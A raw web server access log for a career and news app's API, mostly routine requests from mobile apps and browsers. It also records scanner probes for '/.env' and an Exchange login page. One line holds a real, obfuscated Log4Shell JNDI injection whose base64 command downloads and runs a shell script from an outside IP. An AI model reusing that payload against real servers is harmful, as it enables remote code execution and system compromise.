::1 - - [16/Jun/2022:01:55:16 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.0" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [16/Jun/2022:08:48:46 +0000] "GET /api/v1/articles?limit=6&sort=-createdAt&page=1 HTTP/1.0" 200 44464 "https://icareer.mn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
::ffff:127.0.0.1 - - [16/Jun/2022:08:48:48 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "https://icareer.mn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
::1 - - [16/Jun/2022:08:48:48 +0000] "GET /api/v1/articles/62a2136d182f7ca23c90c6e1 HTTP/1.0" 200 8955 "https://icareer.mn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
::1 - - [16/Jun/2022:08:49:16 +0000] "GET /api/v1/articles?limit=6&sort=-createdAt&page=1 HTTP/1.0" 200 44464 "https://icareer.mn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
::ffff:127.0.0.1 - - [16/Jun/2022:09:09:47 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [16/Jun/2022:09:18:21 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/users/629e1bc29eaf6f8bd9cd120b HTTP/1.0" 200 179 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/odkos HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/tops HTTP/1.0" 200 4811 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/technos HTTP/1.0" 200 16321 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/coins HTTP/1.0" 200 12866 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 200 19072 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/baykas HTTP/1.0" 200 28804 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 200 19072 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/bataas HTTP/1.0" 200 17214 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/deegiis HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:03 +0000] "GET /api/v1/odkos HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:04 +0000] "GET /api/v1/works?select=createdAt&sort=-createdAt&limit=1 HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:04 +0000] "GET /api/v1/headerBanners?limit=10 HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:04 +0000] "GET /api/v1/works?limit=100 HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:04 +0000] "GET /api/v1/magazines?limit=50 HTTP/1.0" 200 194113 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:32:15 +0000] "GET /api/v1/users/629e1bc29eaf6f8bd9cd120b HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:32:15 +0000] "GET /api/v1/ariunzayas/6242b7d61aaad439817a4c59 HTTP/1.0" 200 18993 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:11 +0000] "GET /api/v1/users/629e1bc29eaf6f8bd9cd120b HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /api/v1/works?limit=100 HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e1ee4c36872e4d55f0d03.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /api/v1/users/629e1bc29eaf6f8bd9cd120b HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e242cc36872e4d55f0d4c.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e1fb1c36872e4d55f0d0c.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e214dc36872e4d55f0d15.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e2a3bc36872e4d55f0dcc.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e2b6fc36872e4d55f0dfe.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e2c22c36872e4d55f0e04.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e2adec36872e4d55f0dd2.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e28a7c36872e4d55f0d83.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e1d1ac36872e4d55f0cee.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e27d7c36872e4d55f0d7d.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::ffff:127.0.0.1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__627e2255c36872e4d55f0d43.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:09:33:31 +0000] "GET /upload/work__62738134c36872e4d55eec4e.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.9 CFNetwork/1329 Darwin/21.3.0"
::1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/users/undefined HTTP/1.0" 500 250 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/odkos HTTP/1.0" 200 10198 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 200 19072 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/tops HTTP/1.0" 200 4811 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/technos HTTP/1.0" 200 16321 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:22 +0000] "GET /api/v1/coins HTTP/1.0" 200 12866 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/baykas HTTP/1.0" 200 28804 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/bolors HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/bataas HTTP/1.0" 200 17214 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/odkos HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/deegiis HTTP/1.0" 200 15902 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/works?select=createdAt&sort=-createdAt&limit=1 HTTP/1.0" 200 237 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/headerBanners?limit=10 HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/works?limit=100 HTTP/1.0" 200 12003 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:23 +0000] "GET /api/v1/magazines?limit=50 HTTP/1.0" 200 194113 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:28 +0000] "GET /api/v1/users/undefined HTTP/1.0" 500 250 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:28 +0000] "GET /api/v1/works?limit=100 HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e1ee4c36872e4d55f0d03.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e1fb1c36872e4d55f0d0c.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e1d1ac36872e4d55f0cee.png HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__62738134c36872e4d55eec4e.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e2255c36872e4d55f0d43.png HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e214dc36872e4d55f0d15.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e28a7c36872e4d55f0d83.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e27d7c36872e4d55f0d7d.png HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e2a3bc36872e4d55f0dcc.png HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e242cc36872e4d55f0d4c.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e2adec36872e4d55f0dd2.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e2c22c36872e4d55f0e04.jpg HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:10:16:29 +0000] "GET /upload/work__627e2b6fc36872e4d55f0dfe.png HTTP/1.0" 404 180 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:10:43:28 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [16/Jun/2022:10:43:29 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [16/Jun/2022:11:12:00 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [16/Jun/2022:13:15:43 +0000] "GET /:443:undefined?id= HTTP/1.0" 404 153 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//200.150.202.54:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzIwMC4xNTAuMjA1LjY1LzhVc0Euc2g7IGN1cmwgLU8gaHR0cDovLzIwMC4xNTAuMjA1LjY1LzhVc0Euc2g7IGNobW9kIDc3NyA4VXNBLnNoOyBzaCA4VXNBLnNo}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//200.150.202.54:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzIwMC4xNTAuMjA1LjY1LzhVc0Euc2g7IGN1cmwgLU8gaHR0cDovLzIwMC4xNTAuMjA1LjY1LzhVc0Euc2g7IGNobW9kIDc3NyA4VXNBLnNoOyBzaCA4VXNBLnNo}')"
::1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/users/627b58d5c36872e4d55f06f6 HTTP/1.0" 200 203 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/odkos HTTP/1.0" 200 10198 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/tops HTTP/1.0" 200 4811 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/technos HTTP/1.0" 200 16321 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 200 19072 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:21 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/coins HTTP/1.0" 200 12866 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/bataas HTTP/1.0" 200 17214 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/baykas HTTP/1.0" 200 28804 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/deegiis HTTP/1.0" 200 15902 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/odkos HTTP/1.0" 200 10198 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/works?select=createdAt&sort=-createdAt&limit=1 HTTP/1.0" 200 237 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/headerBanners?limit=10 HTTP/1.0" 200 766 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/works?limit=100 HTTP/1.0" 200 12003 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:22 +0000] "GET /api/v1/magazines?limit=50 HTTP/1.0" 200 194113 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:14:28 +0000] "GET /api/v1/users/627b58d5c36872e4d55f06f6 HTTP/1.0" 304 - "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [16/Jun/2022:14:14:28 +0000] "GET /api/v1/binances/6242b7d71aaad439817a4c5e HTTP/1.0" 200 19617 "-" "Career%20developer/1.0.9 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:20:19 +0000] "GET /api/v1/users/undefined HTTP/1.0" 500 250 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:14:20:20 +0000] "GET /api/v1/technos HTTP/1.0" - - "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:14:54:36 +0000] "GET /upload/photo_626a74fcc36872e4d55eb274.jpeg HTTP/1.0" 404 181 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::1 - - [16/Jun/2022:15:13:48 +0000] "GET /api/v1/works?limit=100 HTTP/1.0" 200 12003 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:13:48 +0000] "GET /api/v1/users/undefined HTTP/1.0" 500 250 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:48 +0000] "GET /upload/work__627e2a3bc36872e4d55f0dcc.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:48 +0000] "GET /upload/work__62738134c36872e4d55eec4e.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e28a7c36872e4d55f0d83.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e2c22c36872e4d55f0e04.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e1ee4c36872e4d55f0d03.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e1d1ac36872e4d55f0cee.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e2255c36872e4d55f0d43.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e27d7c36872e4d55f0d7d.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e242cc36872e4d55f0d4c.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e1fb1c36872e4d55f0d0c.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e2adec36872e4d55f0dd2.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e2b6fc36872e4d55f0dfe.png HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:13:49 +0000] "GET /upload/work__627e214dc36872e4d55f0d15.jpg HTTP/1.0" 404 180 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [16/Jun/2022:15:15:44 +0000] "GET /api/v1/users/undefined HTTP/1.0" 500 250 "-" "Career%20developer/1.0.6 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [16/Jun/2022:15:26:40 +0000] "GET /api/v1/odkos HTTP/1.0" 200 10198 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:41 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:41 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:41 +0000] "GET /api/v1/users/6264eca481428fe338d4df9b HTTP/1.0" 200 182 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:41 +0000] "GET /api/v1/tops HTTP/1.0" 200 4811 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:41 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 200 19072 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:41 +0000] "GET /api/v1/technos HTTP/1.0" 200 16321 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:42 +0000] "GET /api/v1/coins HTTP/1.0" 200 12866 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:43 +0000] "GET /api/v1/binances HTTP/1.0" 200 19696 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:43 +0000] "GET /api/v1/baykas HTTP/1.0" 200 28804 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:43 +0000] "GET /api/v1/ariunzayas HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:43 +0000] "GET /api/v1/bolors HTTP/1.0" 200 19139 "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:43 +0000] "GET /api/v1/bataas HTTP/1.0" 200 17214 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:44 +0000] "GET /api/v1/deegiis HTTP/1.0" 200 15902 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:44 +0000] "GET /api/v1/odkos HTTP/1.0" 304 - "-" "okhttp/3.14.9"
::1 - - [16/Jun/2022:15:26:45 +0000] "GET /api/v1/works?select=createdAt&sort=-createdAt&limit=1 HTTP/1.0" 200 237 "-" "okhttp/3.14.9"
::ffff:127.0.0.1 - - [16/Jun/2022:15:26:45 +0000] "GET /api/v1/headerBanners?limit=10 HTTP/1.0" 200 766 "-" "okhttp/3.14.9"
